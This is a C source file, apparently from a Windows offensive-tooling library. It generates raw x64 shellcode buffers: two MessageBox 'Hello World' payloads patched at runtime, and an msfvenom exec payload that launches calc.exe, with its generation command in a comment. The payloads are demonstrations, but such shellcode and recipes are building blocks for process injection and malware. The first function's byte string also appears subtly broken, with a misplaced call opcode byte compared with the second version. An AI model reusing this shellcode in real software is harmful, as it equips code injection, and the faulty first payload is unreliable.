#include "Win32Helper.h"

PCHAR GenericShellcodeHelloWorldMessageBoxA(_Out_ PDWORD SizeOfShellcodeInBytes)
{
	UCHAR RawPayloadBuffer[] =
		"\x48\xB8\x44\x44\x44\x44\x44\x44\x44\x44\x50\x48\xB8"
		"\x55\x55\x55\x55\x55\x55\x55\x55\x50\x48\x31\xC9\x48"
		"\x89\xE2\x49\x89\xE0\x49\x83\xC0\x08\x4D\x31\xC9\x48"
		"\xB8\x33\x33\x33\x33\x33\x33\x33\x33\x48\x83\xEC\x28"
		"\xD0\x48\x83\xC4\x38\x48\xB8\xEF\xBE\xAD\xDE\xFF\x00"
		"\x00\x00\x00\xC3";

	DWORD RawBufferSize = 70;
	PCHAR Payload;
	LONGLONG OffsetText = 0x4444444444444444;
	CHAR Text[8] = "Hello!";
	LONGLONG OffsetCaption = 0x5555555555555555;
	CHAR Caption[8] = "World";
	LONGLONG OffsetFunction = 0x3333333333333333;
	PVOID FunctionPointer = MessageBoxA;

	Payload = (PCHAR)HeapAlloc(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, RawBufferSize);
	if (Payload == NULL)
		return NULL;

	CopyMemory(Payload, RawPayloadBuffer, RawBufferSize);
	CopyMemory(MemoryFindMemory(Payload, RawBufferSize, (PCHAR)&OffsetText, 8), Text, 8);
	CopyMemory(MemoryFindMemory(Payload, RawBufferSize, (PCHAR)&OffsetCaption, 8), Caption, 8);
	CopyMemory(MemoryFindMemory(Payload, RawBufferSize, (PCHAR)&OffsetFunction, 8), &FunctionPointer, 8);

	*SizeOfShellcodeInBytes = RawBufferSize;

	return Payload;
}

PCHAR GenericShellcodeHelloWorldMessageBoxAEbFbLoop(_Out_ PDWORD SizeOfShellcodeInBytes)
{
	UCHAR RawPayloadBuffer[] =
		"\x48\xB8\x44\x44\x44\x44\x44\x44\x44\x44\x50\x48\xB8"
		"\x55\x55\x55\x55\x55\x55\x55\x55\x50\x48\x31\xC9\x48"
		"\x89\xE2\x49\x89\xE0\x49\x83\xC0\x08\x4D\x31\xC9\x48"
		"\xB8\x33\x33\x33\x33\x33\x33\x33\x33\x48\x83\xEC\x28"
		"\xFF\xD0\x48\x83\xC4\x38\x48\xB8\xEF\xBE\xAD\xDE\x00"
		"\x00\x00\x00\xEB\xFE";

	DWORD RawBufferSize = 71;
	PCHAR Payload;
	LONGLONG OffsetText = 0x4444444444444444;
	CHAR Text[8] = "Hello!";
	LONGLONG OffsetCaption = 0x5555555555555555;
	CHAR Caption[8] = "World";
	LONGLONG OffsetFunction = 0x3333333333333333;
	PVOID FunctionPointer = MessageBoxA;

	Payload = (PCHAR)HeapAlloc(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, RawBufferSize);
	if (Payload == NULL)
		return NULL;

	CopyMemory(Payload, RawPayloadBuffer, RawBufferSize);
	CopyMemory(MemoryFindMemory(Payload, RawBufferSize, (PCHAR)&OffsetText, 8), Text, 8);
	CopyMemory(MemoryFindMemory(Payload, RawBufferSize, (PCHAR)&OffsetCaption, 8), Caption, 8);
	CopyMemory(MemoryFindMemory(Payload, RawBufferSize, (PCHAR)&OffsetFunction, 8), &FunctionPointer, 8);

	*SizeOfShellcodeInBytes = RawBufferSize;

	return Payload;
}

PCHAR GenericShellcodeOpenCalcExitThread(_Out_ PDWORD SizeOfShellcodeInBytes)
{
	//msfvenom -p windows/x64/exec EXITFUNC=thread CMD=calc.exe -f c -a x64
	//Length = 277

	UCHAR RawPayloadBuffer[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	DWORD RawBufferSize = 277;
	PCHAR Payload;

	Payload = (PCHAR)HeapAlloc(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, RawBufferSize);
	if (Payload == NULL)
		return NULL;

	CopyMemory(Payload, RawPayloadBuffer, RawBufferSize);

	*SizeOfShellcodeInBytes = RawBufferSize;

	return Payload;
}